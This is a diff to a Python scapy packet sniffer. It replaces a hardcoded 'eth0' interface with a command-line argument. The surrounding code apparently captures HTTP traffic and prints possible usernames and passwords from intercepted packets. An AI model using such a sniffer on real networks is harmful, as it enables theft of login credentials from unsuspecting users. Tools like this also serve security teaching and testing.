@@ -4,6 +4,16 @@
 
 import scapy.all as scapy
 from scapy.layers import http # Third party module to filter http requests
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-i', '--interface', dest = 'interface', help = "Interface on which you wanna run the packet sniffer")
+    options = parser.parse_args()
+    if not options.interface:
+        parser.error("Please specify the Interface, Use -- help for more info.")
+    else:
+        return options
 
 def sniff(interface):
     #scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet, filter = "port 80") # prn to run the given program whenever we get some packet.
@@ -37,4 +47,6 @@ def process_sniffed_packet(packet):
         if login_info:
             print("\n\n[+] Possible Username/Password >> " + str(login_info) + "\n\n")
 
-sniff("eth0")
+options = get_arguments()
+interface = options.interface
+sniff(interface)
